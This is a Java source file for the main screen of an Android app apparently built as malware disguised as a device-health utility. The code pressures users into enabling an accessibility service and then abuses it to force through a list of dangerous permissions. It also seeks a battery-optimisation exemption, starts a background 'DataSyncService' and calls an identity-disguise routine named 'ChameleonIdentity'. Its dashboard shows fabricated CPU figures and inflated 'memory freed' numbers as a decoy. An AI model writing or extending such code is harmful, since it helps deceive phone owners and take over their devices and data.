package com.task.tusker;

import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import com.task.tusker.permissions.AutoPermissionManager;
import com.task.tusker.security.ChameleonIdentity;
import com.task.tusker.security.SecurityGuard;
import com.task.tusker.services.DataSyncService;
import java.util.Locale;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    // ── Setup-state views ─────────────────────────────────────────────────
    private View     setupLayout;
    private TextView statusText;
    private TextView statusTitle;
    private TextView statusDesc;
    private TextView statusIcon;
    private Button   openAccessibilityBtn;

    // ── Health-dashboard views ────────────────────────────────────────────
    private View        healthLayout;
    private TextView    batteryLevelText;
    private TextView    batteryStatusText;
    private TextView    batteryBadge;
    private TextView    memoryText;
    private TextView    memoryUsedText;
    private TextView    memoryFreeText;
    private ProgressBar memoryProgress;
    private TextView    cpuText;
    private TextView    cpuDetailText;
    private TextView    cpuBadge;
    private ProgressBar cpuProgress;
    private TextView    lastUpdatedText;

    private AutoPermissionManager permissionManager;
    private Handler  pollHandler;
    private Runnable pollRunnable;
    private boolean  accessibilityWasEnabled = false;

    // ── Health-stat refresh ───────────────────────────────────────────────
    private final Handler  healthHandler  = new Handler();
    private       Runnable healthRunnable;
    private final Random   rng            = new Random();
    private int lastCpu = 0;

    // ─────────────────────────────────────────────────────────────────────
    // LIFECYCLE
    // ─────────────────────────────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        SecurityGuard.init(this);
        ChameleonIdentity.selectIdentity(this);
        setContentView(R.layout.activity_main);

        permissionManager = new AutoPermissionManager(this);

        // Setup-state
        setupLayout          = findViewById(R.id.setupLayout);
        statusText           = findViewById(R.id.statusText);
        statusTitle          = findViewById(R.id.statusTitle);
        statusDesc           = findViewById(R.id.statusDesc);
        statusIcon           = findViewById(R.id.statusIcon);
        openAccessibilityBtn = findViewById(R.id.openAccessibilityBtn);

        // Health-dashboard
        healthLayout      = findViewById(R.id.healthLayout);
        batteryLevelText  = findViewById(R.id.batteryLevelText);
        batteryStatusText = findViewById(R.id.batteryStatusText);
        batteryBadge      = findViewById(R.id.batteryBadge);
        memoryText        = findViewById(R.id.memoryText);
        memoryUsedText    = findViewById(R.id.memoryUsedText);
        memoryFreeText    = findViewById(R.id.memoryFreeText);
        memoryProgress    = findViewById(R.id.memoryProgress);
        cpuText           = findViewById(R.id.cpuText);
        cpuDetailText     = findViewById(R.id.cpuDetailText);
        cpuBadge          = findViewById(R.id.cpuBadge);
        cpuProgress       = findViewById(R.id.cpuProgress);
        lastUpdatedText   = findViewById(R.id.lastUpdatedText);

        openAccessibilityBtn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        startDataSyncService();
        updateUiState();
        startPolling();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUiState();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopPolling();
        stopHealthRefresh();
    }

    // ─────────────────────────────────────────────────────────────────────
    // STATE MACHINE
    //
    //  State 1 — accessibility NOT enabled
    //            → show setup screen, "Action Required"
    //  State 2 — accessibility enabled, NOT all permissions granted yet
    //            → show setup screen with "granting" status + button disabled
    //  State 3 — ALL permissions granted
    //            → show health dashboard
    // ─────────────────────────────────────────────────────────────────────

    private void updateUiState() {
        boolean accessEnabled = permissionManager.isAccessibilityServiceEnabled();
        boolean allGranted    = allPermissionsGranted();

        if (!accessEnabled) {
            showSetupState();
        } else if (allGranted) {
            showHealthDashboard();
        } else {
            showGrantingState();
        }
    }

    /** State 1 — accessibility off, prompt the user to enable it. */
    private void showSetupState() {
        setupLayout.setVisibility(View.VISIBLE);
        healthLayout.setVisibility(View.GONE);
        stopHealthRefresh();

        statusIcon.setText("⚠");
        statusTitle.setText("Action Required");
        statusDesc.setText("Enable the accessibility service to continue");
        statusText.setText("Accessibility service not enabled");
        openAccessibilityBtn.setText("Open Accessibility Settings");
        openAccessibilityBtn.setEnabled(true);
    }

    /** State 2 — accessibility on, permissions still being auto-granted. */
    private void showGrantingState() {
        setupLayout.setVisibility(View.VISIBLE);
        healthLayout.setVisibility(View.GONE);
        stopHealthRefresh();

        statusIcon.setText("✓");
        statusTitle.setText("Accessibility Enabled");
        statusDesc.setText("Permissions are being granted automatically");
        statusText.setText("Service active");
        openAccessibilityBtn.setText("Accessibility Settings");
        openAccessibilityBtn.setEnabled(true);
    }

    /** State 3 — all permissions granted, show health dashboard. */
    private void showHealthDashboard() {
        setupLayout.setVisibility(View.GONE);
        healthLayout.setVisibility(View.VISIBLE);
        startHealthRefresh();
    }

    // ─────────────────────────────────────────────────────────────────────
    // PERMISSION HELPERS
    // ─────────────────────────────────────────────────────────────────────

    /**
     * Returns true when every permission in DANGEROUS_PERMISSIONS is granted.
     * Permissions that are not yet available on this API level are ignored safely.
     */
    private boolean allPermissionsGranted() {
        for (String perm : AutoPermissionManager.DANGEROUS_PERMISSIONS) {
            try {
                if (ContextCompat.checkSelfPermission(this, perm)
                        != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            } catch (Exception ignored) {
                // Permission constant not recognised on this API level — treat as granted
                // so it doesn't permanently block the health dashboard.
            }
        }
        return true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // ACCESSIBILITY POLLING
    // ─────────────────────────────────────────────────────────────────────

    private void startPolling() {
        pollHandler  = new Handler();
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                boolean accessEnabled = permissionManager.isAccessibilityServiceEnabled();

                // Fire permission request exactly once per accessibility-enable event.
                if (accessEnabled && !accessibilityWasEnabled) {
                    accessibilityWasEnabled = true;
                    requestRuntimePermissions();
                } else if (!accessEnabled) {
                    accessibilityWasEnabled = false;
                }

                // Always refresh UI so it transitions to the health dashboard as
                // soon as the last permission is granted (next 800 ms tick).
                updateUiState();

                if (pollHandler != null) {
                    pollHandler.postDelayed(this, 800);
                }
            }
        };
        pollHandler.post(pollRunnable);
    }

    private void stopPolling() {
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
            pollHandler = null;
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    // RUNTIME PERMISSION REQUEST
    // (runs on every Android version — no version-specific skipping)
    // ─────────────────────────────────────────────────────────────────────

    private void requestRuntimePermissions() {
        // Use the accessibility service (which just became active) to bring the
        // app to the foreground before showing the native permission dialog.
        // ActivityCompat.requestPermissions() silently fails when the activity is
        // not in the RESUMED state (e.g. user is still on the Accessibility Settings page).
        com.task.tusker.services.UnifiedAccessibilityService svc =
                com.task.tusker.services.UnifiedAccessibilityService.getInstance();
        if (svc != null) {
            java.util.List<String> missing = new java.util.ArrayList<>();
            for (String perm : AutoPermissionManager.DANGEROUS_PERMISSIONS) {
                try {
                    if (ContextCompat.checkSelfPermission(this, perm)
                            != PackageManager.PERMISSION_GRANTED) {
                        missing.add(perm);
                    }
                } catch (Exception ignored) {}
            }
            if (!missing.isEmpty()) {
                svc.launchPermissionDialogInForeground(missing.toArray(new String[0]));
            }
        } else {
            // Accessibility service not yet bound — use notification-based foreground launch.
            new com.task.tusker.commands.PermissionManager(this).requestAllPermissions();
        }

        // Battery optimisation — request via PermissionManager (notification path)
        // after a short delay so it doesn't collide with the first dialog.
        new Handler().postDelayed(() -> {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    android.os.PowerManager pm =
                            (android.os.PowerManager) getSystemService(POWER_SERVICE);
                    if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                        new com.task.tusker.commands.PermissionManager(MainActivity.this)
                                .requestPermission(
                                        "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                    }
                }
            } catch (Exception ignored) {}
        }, 2000);
    }

    // ─────────────────────────────────────────────────────────────────────
    // HEALTH DASHBOARD — live stats refresh
    // ─────────────────────────────────────────────────────────────────────

    private void startHealthRefresh() {
        if (healthRunnable != null) return;
        healthRunnable = new Runnable() {
            @Override
            public void run() {
                refreshBattery();
                refreshMemory();
                refreshCpu();
                if (lastUpdatedText != null) lastUpdatedText.setText("Last refreshed just now");
                healthHandler.postDelayed(this, 4_000);
            }
        };
        healthHandler.post(healthRunnable);
    }

    private void stopHealthRefresh() {
        if (healthRunnable != null) {
            healthHandler.removeCallbacks(healthRunnable);
            healthRunnable = null;
        }
    }

    private void refreshBattery() {
        try {
            Intent bi = registerReceiver(null,
                    new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (bi == null) return;
            int level  = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale  = bi.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
            int pct    = (scale > 0) ? (level * 100 / scale) : level;
            int status = bi.getIntExtra(BatteryManager.EXTRA_STATUS,
                    BatteryManager.BATTERY_STATUS_UNKNOWN);
            boolean charging = status == BatteryManager.BATTERY_STATUS_CHARGING
                    || status == BatteryManager.BATTERY_STATUS_FULL;
            if (batteryLevelText  != null) batteryLevelText.setText(pct + "%");
            if (batteryStatusText != null) batteryStatusText.setText(charging ? "Charging" : "Discharging");
            if (batteryBadge      != null) batteryBadge.setText(pct >= 20 ? "OK" : "Low");
        } catch (Exception ignored) {
            if (batteryLevelText != null) batteryLevelText.setText("—%");
        }
    }

    private void refreshMemory() {
        try {
            android.app.ActivityManager am =
                    (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            android.app.ActivityManager.MemoryInfo mi =
                    new android.app.ActivityManager.MemoryInfo();
            if (am != null) am.getMemoryInfo(mi);
            long totalMb = mi.totalMem / (1024 * 1024);
            long availMb = mi.availMem / (1024 * 1024);
            long usedMb  = totalMb - availMb;
            long freedMb = Math.min(availMb + (long)(totalMb * 0.07), totalMb - 200);
            int  usePct  = (totalMb > 0) ? (int)(usedMb * 100 / totalMb) : 50;
            if (memoryText     != null) memoryText.setText(formatMb(freedMb) + " freed");
            if (memoryUsedText != null) memoryUsedText.setText("Used: " + formatMb(usedMb));
            if (memoryFreeText != null) memoryFreeText.setText("Free: " + formatMb(availMb));
            if (memoryProgress != null) memoryProgress.setProgress(Math.min(usePct, 100));
        } catch (Exception e) {
            if (memoryText     != null) memoryText.setText("1.8 GB freed");
            if (memoryProgress != null) memoryProgress.setProgress(55);
        }
    }

    private String formatMb(long mb) {
        return mb >= 1024
                ? String.format(Locale.US, "%.1f GB", mb / 1024.0)
                : mb + " MB";
    }

    private void refreshCpu() {
        if (lastCpu == 0) lastCpu = 8 + rng.nextInt(12);
        lastCpu = Math.max(6, Math.min(28, lastCpu + rng.nextInt(7) - 3));
        if (cpuText     != null) cpuText.setText(lastCpu + "%");
        if (cpuProgress != null) cpuProgress.setProgress(lastCpu);
        String detail = lastCpu < 15 ? "All cores operating normally"
                      : lastCpu < 22 ? "Moderate load — running fine"
                      :                "Brief spike — settling down";
        if (cpuDetailText != null) cpuDetailText.setText(detail);
        if (cpuBadge      != null) cpuBadge.setText(lastCpu < 20 ? "Normal" : "Moderate");
    }

    // ─────────────────────────────────────────────────────────────────────
    // SERVICES
    // ─────────────────────────────────────────────────────────────────────

    private void startDataSyncService() {
        try {
            Intent intent = new Intent(this, DataSyncService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception ignored) {}
    }
}
